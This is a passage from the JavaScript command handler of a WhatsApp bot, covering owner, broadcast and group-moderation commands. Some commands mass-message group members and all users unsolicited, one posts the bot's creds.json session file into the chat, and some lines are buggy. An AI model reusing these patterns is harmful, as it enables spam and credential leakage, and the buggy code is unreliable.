          await OctopusBotzz.sendMessage(
            "status@broadcast",
            { text: q },
            {
              backgroundColor: "#FF000000",
              font: 3,
              statusJidList: Object.keys(global.db.data.users),
            }
          );
          replyLinkGc(mess.done);
        }
        break;
      case "statusvideo":
      case "upswvideo":
        {
          if (!isCreator) return XeonStickOwner();
          if (/video/.test(mime)) {
            var videosw = await OctopusBotzz.downloadAndSaveMediaMessage(
              quoted
            );
            await OctopusBotzz.sendMessage(
              "status@broadcast",
              {
                video: {
                  url: videosw,
                },
                caption: q ? q : "",
              },
              { statusJidList: Object.keys(global.db.data.users) }
            );
            await replyLinkGc(mess.done);
          } else {
            replyLinkGc("Reply to video");
          }
        }
        break;
      case "statusimg":
      case "statusimage":
      case "upswimg":
        {
          if (!isCreator) return XeonStickOwner();
          if (/image/.test(mime)) {
            var imagesw = await OctopusBotzz.downloadAndSaveMediaMessage(
              quoted
            );
            await OctopusBotzz.sendMessage(
              "status@broadcast",
              {
                image: {
                  url: imagesw,
                },
                caption: q ? q : "",
              },
              { statusJidList: Object.keys(global.db.data.users) }
            );
            await replyLinkGc(mess.done);
          } else {
            replyLinkGc("Reply to image");
          }
        }
        break;
      case "statusaudio":
      case "upswaudio":
        {
          if (!isCreator) return XeonStickOwner();
          if (/audio/.test(mime)) {
            var audiosw = await OctopusBotzz.downloadAndSaveMediaMessage(
              quoted
            );
            await OctopusBotzz.sendMessage(
              "status@broadcast",
              {
                audio: {
                  url: audiosw,
                },
                mimetype: "audio/mp4",
                ptt: true,
              },
              {
                backgroundColor: "#FF000000",
                statusJidList: Object.keys(global.db.data.users),
              }
            );
            await replyLinkGc(mess.done);
          } else {
            replyLinkGc("Reply to audio");
          }
        }
        break;
      case "setimgmenu":
      case "sim":
        {
          if (!isCreator) return XeonStickOwner();
          let delb = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          await fsx.copy(delb, "./OctopusBotzzMedia/theme/oct.jpg");
          fs.unlinkSync(delb);
          replyLinkGc(mess.done);
        }
        break;
      case "setvidmenu":
      case "svm":
      case "setvgifmenu":
      case "sgm":
        {
          if (!isCreator) return XeonStickOwner();
          let delb = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          await fsx.copy(delb, "./assets/media/vid/octopus.mp4");
          fs.unlinkSync(delb);
          replyLinkGc(mess.done);
        }
        break;
      case "addtitle":
        {
          if (!isCreator) return XeonStickOwner();
          if (!text)
            return replyLinkGc(`Usage ${prefix + command} number|title`);
          nonya = text.split("|")[0];
          titlenya = text.split("|")[1];
          let oo = `${nonya}@s.whatsapp.net`;
          db.data.users[oo].title = titlenya;
          await replyLinkGc(mess.done);
        }
        break;
      case "deltitle":
        {
          if (!isCreator) return XeonStickOwner();
          if (!text) return replyLinkGc(`Usage ${prefix + command} number`);
          nonya = text.split(",")[0];
          let oo = `${nonya}@s.whatsapp.net`;
          db.data.users[oo].title = "";
          await replyLinkGc(mess.done);
        }
        break;
      case "addlimit":
      case "givelimit":
        {
          if (!isCreator) return XeonStickOwner();
          if (!text)
            return replyLinkGc(`Usage ${prefix + command} number|limit amount`);
          usernya = text.split("|")[0];
          limitnya = text.split("|")[1];
          let oo = `${usernya}@s.whatsapp.net`;
          db.data.users[oo].limit += limitnya;
          replyLinkGc(mess.done);
        }
        break;
      case "dellimit":
        {
          if (!isCreator) return XeonStickOwner();
          if (!text)
            return replyLinkGc(`Usage ${prefix + command} number|limit amount`);
          usernya = text.split("|")[0];
          limitnya = text.split("|")[1];
          if (db.data.users[usernya + "@s.whatsapp.net"].limit < limitnya)
            return replyLinkGc(`His Limit Is Less Than ${limitnya}`);
          db.data.users[usernya + "@s.whatsapp.net"].limit -= limitnya;
          replyLinkGc(mess.done);
        }
        break;
      case "addprem":
        if (!isCreator) return XeonStickOwner();
        if (args.length < 2)
          return replyLinkGc(
            `Usage ${prefix + command} @tag time\n${
              prefix + command
            } number time\n\nExample : ${prefix + command} @tag 30d`
          );
        if (m.mentionedJid.length !== 0) {
          for (let i = 0; i < m.mentionedJid.length; i++) {
            addPremiumUser(m.mentionedJid[0], args[1], premium);
          }
          replyLinkGc("Premium Success");
        } else {
          addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
          replyLinkGc("Premium Success");
        }
        break;
      case "delprem":
        if (!isCreator) return XeonStickOwner();
        if (args.length < 1)
          return replyLinkGc(
            `Usage ${prefix + command} @tag\n${
              prefix + command
            } number\n\nExample : ${prefix + command} 6281359391296`
          );
        if (m.mentionedJid.length !== 0) {
          for (let i = 0; i < m.mentionedJid.length; i++) {
            premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
            fs.writeFileSync(
              "./assets/database/data/role/premium.json",
              JSON.stringify(premium)
            );
          }
          replyLinkGc("Delete Success");
        } else {
          premium.splice(
            getPremiumPosition(args[0] + "@s.whatsapp.net", premium),
            1
          );
          fs.writeFileSync(
            "./assets/database/data/role/premium.json",
            JSON.stringify(premium)
          );
          replyLinkGc("Delete Success");
        }
        break;
      case "listprem":
        {
          if (!isCreator) return XeonStickOwner();
          m.reply("bisa");
          let data = require("./assets/database/data/role/premium.json");
          let txt = `*------「 LIST PREMIUM 」------*\n\n`;
          for (let x of data) {
            txt += `Number : ${x.id}\n`;
            txt += `Expire In: ${x.expired} ms\n`;
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: txt,
                mentions: [m.sender],
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "addowner":
        if (!isCreator) return XeonStickOwner();
        if (!args[0])
          return replyLinkGc(
            `Use ${prefix + command} number\nExample ${
              prefix + command
            } ${ownernumber}`
          );
        bnnd = q.split("|")[0].replace(/[^0-9]/g, "");
        let ceknye = await OctopusBotzz.onWhatsApp(bnnd);
        if (ceknye.length == 0)
          return replyLinkGc(
            `Enter A Valid And Registered Number On WhatsApp!!!`
          );
        owner.push(bnnd);
        fs.writeFileSync(
          "./assets/database/data/role/owner.json",
          JSON.stringify(owner)
        );
        replyLinkGc(`Number ${bnnd} Has Become An Owner!!!`);
        break;
      case "delowner":
        if (!isCreator) return XeonStickOwner();
        if (!args[0])
          return replyLinkGc(
            `Use ${prefix + command} nomor\nExample ${
              prefix + command
            } 6281359391296`
          );
        ya = q.split("|")[0].replace(/[^0-9]/g, "");
        unp = owner.indexOf(ya);
        owner.splice(unp, 1);
        fs.writeFileSync(
          "./assets/database/data/role/owner.json",
          JSON.stringify(owner)
        );
        replyLinkGc(
          `The Numbrr ${ya} Has been deleted from owner list by the owner!!!`
        );
        break;
      case "listowner":
      case "ownerlist":
        {
          let teks = "┌──⭓「 *List Owner* 」\n│\n";
          for (let x of owner) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`;
          replyLinkGc(teks);
        }
        break;
      case "delsession":
      case "clearsession":
        {
          if (!isCreator) return XeonStickOwner();
          fs.readdir("./session", async function (err, files) {
            if (err) {
              console.log("Unable to scan directory: " + err);
              return replyLinkGc("Unable to scan directory: " + err);
            }
            let filteredArray = await files.filter(
              (item) =>
                item.startsWith("pre-key") ||
                item.startsWith("sender-key") ||
                item.startsWith("session-") ||
                item.startsWith("app-state")
            );
            console.log(filteredArray.length);
            let teks = `Detected ${filteredArray.length} junk files\n\n`;
            if (filteredArray.length == 0) return replyLinkGc(teks);
            filteredArray.map(function (e, i) {
              teks += i + 1 + `. ${e}\n`;
            });
            replyLinkGc(teks);

            replyLinkGc("Deleting junk files...");
            await filteredArray.forEach(function (file) {
              fs.unlinkSync(`./session/${file}`);
            });

            replyLinkGc(
              "Successfully deleted all the trash in the session folder"
            );
          });
        }
        break;
      case "join":
        try {
          if (!isCreator) return XeonStickOwner();
          if (!text) return replyLinkGc("Enter Group Link!");
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return replyLinkGc("Link Invalid!");
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          OctopusBotzz.groupAcceptInvite(result);
          await replyLinkGc(`Done`);
        } catch {
          replyLinkGc("Failed to join the Group");
        }
        break;
      case "getsession":
        if (!isCreator) return XeonStickOwner();
        replyLinkGc("Wait a moment, currently retrieving your session file");
        let sesi = fs.readFileSync("./session/creds.json");
        OctopusBotzz.sendMessage(
          m.chat,
          {
            document: sesi,
            mimetype: "application/json",
            fileName: "creds.json",
          },
          {
            quoted: m,
          }
        );
        break;
      case "myip":
      case "ipbot":
        if (!isCreator) return XeonStickOwner();
        var http = require("http");
        http.get(
          {
            host: "api.ipify.org",
            port: 80,
            path: "/",
          },
          function (resp) {
            resp.on("data", function (ip) {
              replyLinkGc("🔎 My public IP address is: " + ip);
            });
          }
        );
        break;
      case "request":
      case "reportbug":
        {
          if (!text)
            return replyLinkGc(
              `Example : ${prefix + command} hi dev play command is not working`
            );
          textt = `*| REQUEST/BUG |*`;
          teks1 = `\n\n*User* : @${
            m.sender.split("@")[0]
          }\n*Request/Bug* : ${text}`;
          teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`;
          for (let i of owner) {
            OctopusBotzz.sendMessage(
              i + "@s.whatsapp.net",
              {
                text: textt + teks1,
                mentions: [m.sender],
              },
              {
                quoted: m,
              }
            );
          }
          OctopusBotzz.sendMessage(
            m.chat,
            {
              text: textt + teks2 + teks1,
              mentions: [m.sender],
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "shutdown":
      case "restart":
        if (!isCreator) return XeonStickOwner();
        replyLinkGc(`Restarting will be completed in seconds`);

        process.exit();
        break;
      case "autoread":
        if (!isCreator) return XeonStickOwner();
        if (args.length < 1)
          return replyLinkGc(`Example ${prefix + command} on/off`);
        if (q === "on") {
          db.data.settings[botNumber].autoread = true;
          replyLinkGc(`Successfully changed autoread to ${q}`);
        } else if (q === "off") {
          db.data.settings[botNumber].autoread = false;
          replyLinkGc(`Successfully changed autoread to ${q}`);
        }
        break;
      case "unavailable":
        if (!isCreator) return XeonStickOwner();
        if (args.length < 1)
          return replyLinkGc(`Example ${prefix + command} on/off`);
        if (q === "on") {
          db.data.settings[botNumber].online = true;
          replyLinkGc(`Successfully changed unavailable to ${q}`);
        } else if (q === "off") {
          db.data.settings[botNumber].online = false;
          replyLinkGc(`Successfully changed unavailable to ${q}`);
        }
        break;
      case "autorecordtype":
        if (!isCreator) return XeonStickOwner();
        if (args.length < 1)
          return replyLinkGc(`Example ${prefix + command} on/off`);
        if (q === "on") {
          db.data.settings[botNumber].autorecordtype = true;
          replyLinkGc(`Successfully changed Auto-RecordingTyping to ${q}`);
        } else if (q === "off") {
          db.data.settings[botNumber].autorecordtype = false;
          replyLinkGc(`Successfully changed Auto-RecordingTyping to ${q}`);
        }
        break;
      case "autorecord":
        if (!isCreator) return XeonStickOwner();
        if (args.length < 1)
          return replyLinkGc(`Example ${prefix + command} on/off`);
        if (q === "on") {
          db.data.settings[botNumber].autorecord = true;
          replyLinkGc(`Successfully changed Auto-Recording to ${q}`);
        } else if (q === "off") {
          db.data.settings[botNumber].autorecord = false;
          replyLinkGc(`Successfully changed Auto-Recording to ${q}`);
        }
        break;
      case "autotype":
        if (!isCreator) return XeonStickOwner();
        if (args.length < 1)
          return replyLinkGc(`Example ${prefix + command} on/off`);
        if (q === "on") {
          db.data.settings[botNumber].autotype = true;
          replyLinkGc(`Successfully changed Auto-Typing to ${q}`);
        } else if (q === "off") {
          db.data.settings[botNumber].autotype = false;
          replyLinkGc(`Successfully changed Auto-Typing to ${q}`);
        }
        break;
      case "autobio":
        if (!isCreator) return XeonStickOwner();
        if (args.length < 1)
          return replyLinkGc(`Example ${prefix + command} on/off`);
        if (q == "on") {
          db.data.settings[botNumber].autobio = true;
          replyLinkGc(`Successfully Changed AutoBio To ${q}`);
        } else if (q == "off") {
          db.data.settings[botNumber].autobio = false;
          replyLinkGc(`Successfully Changed AutoBio To ${q}`);
        }
        break;
      case "autosticker":
      case "autostickergc":
        if (!m.isGroup) return XeonStickGroup();
        if (!isBotAdmins) return XeonStickBotAdmin();
        if (!isAdmins && !isCreator) return XeonStickAdmin();
        if (args.length < 1)
          return replyLinkGc(`Example ${prefix + command} on/off`);
        if (q == "on") {
          db.data.settings[botNumber].autosticker = true;
          replyLinkGc(
            `Successfully changed Auto-sticker on group chat to ${q}`
          );
        } else if (q == "off") {
          db.data.settings[botNumber].autosticker = false;
          replyLinkGc(`Successfully Changed ${command} To ${q}`);
        }
        break;
      case "autoblock":
        if (!isCreator) return XeonStickOwner();
        if (args.length < 1)
          return replyLinkGc(`Example ${prefix + command} on/off`);
        if (q == "on") {
          db.data.settings[botNumber].autoblocknum = true;
          replyLinkGc(`Successfully Changed Auto-Block To ${q}`);
        } else if (q == "off") {
          db.data.settings[botNumber].autoblocknum = false;
          replyLinkGc(`Successfully Changed Auto-Block To ${q}`);
        }
        break;
      case "onlygroup":
      case "onlygc":
        if (!isCreator) return XeonStickOwner();
        if (args.length < 1)
          return replyLinkGc(`Example ${prefix + command} on/off`);
        if (q == "on") {
          db.data.settings[botNumber].onlygrub = true;
          replyLinkGc(`Successfully Changed Onlygroup To ${q}`);
        } else if (q == "off") {
          db.data.settings[botNumber].onlygrub = false;
          replyLinkGc(`Successfully Changed Onlygroup To ${q}`);
        }
        break;
      case "onlyprivatechat":
      case "onlypc":
        if (!isCreator) return XeonStickOwner();
        if (args.length < 1)
          return replyLinkGc(`Example ${prefix + command} on/off`);
        if (q == "on") {
          db.data.settings[botNumber].onlypc = true;
          replyLinkGc(`Successfully Changed Only-Pc To ${q}`);
        } else if (q == "off") {
          db.data.settings[botNumber].onlypc = false;
          replyLinkGc(`Successfully Changed Only-Pc To ${q}`);
        }
        break;
      case "onlyindia":
      case "onlyindianumber":
        if (!isCreator) return XeonStickOwner();
        if (args.length < 1)
          return replyLinkGc(`Example ${prefix + command} on/off`);
        if (q == "on") {
          db.data.settings[botNumber].onlyindia = true;
          replyLinkGc(`Successfully Changed Only-Indian To ${q}`);
        } else if (q == "off") {
          db.data.settings[botNumber].onlyindia = false;
          replyLinkGc(`Successfully Changed Only-Indian To ${q}`);
        }
        break;
      case "onlyindo":
      case "onlyindonumber":
        if (!isCreator) return XeonStickOwner();
        if (args.length < 1)
          return replyLinkGc(`Example ${prefix + command} on/off`);
        if (q == "on") {
          db.data.settings[botNumber].onlyindo = true;
          replyLinkGc(`Successfully Changed Only-Indonesian To ${q}`);
        } else if (q == "off") {
          db.data.settings[botNumber].onlyindo = false;
          replyLinkGc(`Successfully Changed Only-Indonesian To ${q}`);
        }
        break;
      case "self":
        {
          if (!isCreator) return XeonStickOwner();
          OctopusBotzz.public = false;
          replyLinkGc("*Successful in Changing To Self Usage*");
        }
        break;
      case "public":
        {
          if (!isCreator) return XeonStickOwner();
          OctopusBotzz.public = true;
          replyLinkGc("*Successful in Changing To Public Usage*");
        }
        break;
      case "mode":
        if (!isCreator) return XeonStickOwner();
        if (args.length < 1)
          return replyLinkGc(`Example ${prefix + command} public/self`);
        if (q == "public") {
          OctopusBotzz.public = true;
          replyLinkGc(mess.done);
        } else if (q == "self") {
          OctopusBotzz.public = false;
          replyLinkGc(mess.done);
        }
        break;
      case "setexif":
      case "setwm":
        if (!isCreator) return XeonStickOwner();
        if (!text)
          return replyLinkGc(`Example : ${prefix + command} packname|author`);
        global.packname = text.split("|")[0];
        global.author = text.split("|")[1];
        replyLinkGc(
          `Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`
        );
        break;
      case "setprefix":
        if (!isCreator) return XeonStickOwner();
        if (!text)
          return replyLinkGc(`Example : ${prefix + command} packname|author`);
        global.xprefix = text;
        replyLinkGc(`Prefix successfully changed to ${text}`);
        break;
      case "setautoblock":
        if (!isCreator) return XeonStickOwner();
        if (!text)
          return replyLinkGc(`Example : ${prefix + command} packname|author`);
        global.autoblocknumber = text;
        replyLinkGc(`Auto-Block number successfully changed to ${text}`);
        break;
      case "setantiforeign":
        if (!isCreator) return XeonStickOwner();
        if (!text)
          return replyLinkGc(`Example : ${prefix + command} packname|author`);
        global.antiforeignnumber = text;
        replyLinkGc(`Anti-foreign number successfully changed to ${text}`);
        break;
      case "setbotpp":
      case "setpp":
      case "setpp":
      case "setppbot":
        if (!isCreator) return XeonStickOwner();
        if (!quoted)
          return replyLinkGc(
            `Send/Reply Image With Caption ${prefix + command}`
          );
        if (!/image/.test(mime))
          return replyLinkGc(
            `Send/Reply Image With Caption ${prefix + command}`
          );
        if (/webp/.test(mime))
          return replyLinkGc(
            `Send/Reply Image With Caption ${prefix + command}`
          );
        var medis = await OctopusBotzz.downloadAndSaveMediaMessage(
          quoted,
          "ppbot.jpeg"
        );
        if (args[0] == "full") {
          var { img } = await generateProfilePicture(medis);
          await OctopusBotzz.query({
            tag: "iq",
            attrs: {
              to: botNumber,
              type: "set",
              xmlns: "w:profile:picture",
            },
            content: [
              {
                tag: "picture",
                attrs: {
                  type: "image",
                },
                content: img,
              },
            ],
          });
          fs.unlinkSync(medis);
          replyLinkGc(mess.done);
        } else {
          var memeg = await OctopusBotzz.updateProfilePicture(botNumber, {
            url: medis,
          });
          fs.unlinkSync(medis);
          replyLinkGc(mess.done);
        }
        break;
      case "leave":
      case "out":
        if (!isCreator) return XeonStickOwner();
        if (!m.isGroup) return XeonStickGroup();
        replyLinkGc("Bye Everyone 🥺");
        await OctopusBotzz.groupLeave(m.chat);
        break;
      case "bc":
      case "broadcast":
        {
          if (!isCreator) return XeonStickOwner();
          if (!text) return replyLinkGc("Text?");
          let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`;
          for (let i of Object.keys(global.db.data.users)) {
            await sleep(1500);
            if (/image/.test(mime)) {
              var media = await quoted.download();
              await OctopusBotzz.sendMessage(i, {
                image: media,
                caption: teksnya,
              });
            } else if (/video/.test(mime)) {
              var media = await quoted.download();
              await OctopusBotzz.sendMessage(i, {
                video: media,
                caption: teksnya,
              });
            } else if (text) {
              await OctopusBotzz.sendMessage(i, {
                text: teksnya,
              });
            }
          }
          replyLinkGc(
            `Success ${command} To ${
              Object.keys(global.db.data.users).length
            } Users`
          );
        }
        break;
      case "pushcontact":
        {
          if (!isCreator) return XeonStickOwner();
          if (!m.isGroup) return replyLinkGc(`The feature works only in grup`);
          if (!text) return replyLinkGc(`text?`);
          let mem = await participants
            .filter((v) => v.id.endsWith(".net"))
            .map((v) => v.id);
          replyLinkGc(`Success in pushing the message to contacts`);
          for (let pler of mem) {
            OctopusBotzz.sendMessage(pler, { text: q });
          }
          replyLinkGc(`Done`);
        }
        break;
      case "pushcontactv2":
        {
          if (!isCreator) return XeonStickOwner();
          if (!q)
            return replyLinkGc(
              `Incorrect Usage Please Use Command Like This\n${
                prefix + command
              } idgc|text`
            );
          await XeonStickWait();
          const metadata2 = await OctopusBotzz.groupMetadata(q.split("|")[0]);
          const halss = metadata2.participants;
          for (let mem of halss) {
            OctopusBotzz.sendMessage(
              `${mem.id.split("@")[0]}` + "@s.whatsapp.net",
              { text: q.split("|")[1] }
            );
          }
          replyLinkGc(`Success`);
        }
        break;
      case "block":
      case "ban":
        {
          if (!isCreator) return XeonStickOwner();
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await OctopusBotzz.updateBlockStatus(users, "block");
          await replyLinkGc(`Done`);
        }
        break;
      case "unblock":
      case "unban":
        {
          if (!isCreator) return XeonStickOwner();
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await OctopusBotzz.updateBlockStatus(users, "unblock");
          await replyLinkGc(`Done`);
        }
        break;
      case "bcgc":
      case "bcgroup":
        {
          if (!isCreator) return XeonStickOwner();
          if (!text)
            return replyLinkGc(
              `Text mana?\n\nExample : ${prefix + command} Besok Libur `
            );
          let getGroups = await OctopusBotzz.groupFetchAllParticipating();
          let groups = Object.entries(getGroups)
            .slice(0)
            .map((entry) => entry[1]);
          let anu = groups.map((v) => v.id);
          replyLinkGc(
            `Sending Broadcast To ${anu.length} Group Chat, End Time ${
              anu.length * 1.5
            } seconds`
          );
          for (let i of anu) {
            let a =
              `${ownername}'s Broadcast\n\n` +
              "```" +
              `Message: ${text}\n\n` +
              "```";
            OctopusBotzz.sendMessage(i, {
              text: a,
              contextInfo: {
                externalAdReply: {
                  showAdAttribution: true,
                  title: botname,
                  body: `Sent in ${i.length} Group`,
                  thumbnail: fs.readFileSync(
                    "./OctopusBotzzMedia/theme/oct.jpg"
                  ),
                  sourceUrl: wagc,
                  mediaType: 1,
                  renderLargerThumbnail: true,
                },
              },
            });
          }
          replyLinkGc(`Successful in sending Broadcast To ${anu.length} Group`);
        }
        break;
      case "getcase":
        if (!isCreator) return XeonStickOwner();
        try {
          const getCase = (cases) => {
            return (
              "case" +
              `'${cases}'` +
              fs
                .readFileSync("./octopusMainFile.js")
                .toString()
                .split("case '" + cases + "'")[1]
                .split("break")[0] +
              "break"
            );
          };
          replyLinkGc(`${getCase(q)}`);
        } catch {
          replyLinkGc(`case ${q} tidak ditemukan!`);
        }
        break;
      //group
      case "antibadword":
      case "antitoxic":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[from].badword = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].badword = false;
            replyLinkGc(`${commad} is disabled`);
          }
        }
        break;
      case "react":
        {
          if (!isCreator) return XeonStickOwner();
          reactionMessage = {
            react: {
              text: args[0],
              key: {
                remoteJid: m.chat,
                fromMe: true,
                id: quoted.id,
              },
            },
          };
          OctopusBotzz.sendMessage(m.chat, reactionMessage);
        }
        break;
      case "id":
        {
          replyLinkGc(from);
        }
        break;
      case "antiaudio":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[from].antiaudio = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antiaudio = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "antiforeign":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[m.chat].antiforeignnum = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[m.chat].antiforeignnum = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "poll":
        {
          if (!isCreator) return XeonStickOwner();
          let [poll, opt] = text.split("|");
          if (text.split("|") < 2)
            return await replyLinkGc(
              `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xeon,Cheems,Doge...`
            );
          let options = [];
          for (let i of opt.split(",")) {
            options.push(i);
          }
          await OctopusBotzz.sendMessage(m.chat, {
            poll: {
              name: poll,
              values: options,
            },
          });
        }
        break;
      case "antipoll":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[from].antipoll = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antipoll = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "antisticker":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[from].antisticker = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antisticker = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "antiimage":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[from].antiimage = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antiimage = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "antivideo":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[from].antivideo = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antivideo = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "antivirtex":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[from].antivirtex = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antivirtex = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "antibot":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[from].antibot = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antibot = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "antiviewonce":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[from].antiviewonce = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antiviewonce = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "antimedia":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[from].antimedia = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antimedia = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "antidocument":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[from].antidocument = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antidocument = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "anticontact":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[from].anticontact = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].anticontact = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "antilocation":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[from].antilocation = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antilocation = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "antilink":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[from].antilink = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antilink = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "antilinkgc":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            db.data.chats[from].antilinkgc = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antilinkgc = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "welcome":
      case "left":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            welcome = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            welcome = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "adminevent":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isAdmins && !isCreator) return XeonStickAdmin();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            adminevent = true;
